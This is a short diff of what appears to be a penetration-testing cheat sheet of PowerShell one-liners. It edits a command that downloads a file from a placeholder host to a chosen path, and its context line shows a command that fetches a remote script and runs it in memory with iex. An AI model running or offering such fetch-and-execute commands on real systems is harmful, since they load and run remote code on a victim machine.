@@ -15,6 +15,8 @@ powershell iex(New-Object Net.WebClient).DownloadString('http://ip/Invoke-PowerS
 ```
 
 ```
-powershell -c "(New-Object Net.WebClient).DownloadFile('http://ip/filename.ext','filename.ext')"
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://ip/filename.ext','C:\filelocation\filename.ext')"
 ```
+
+
 
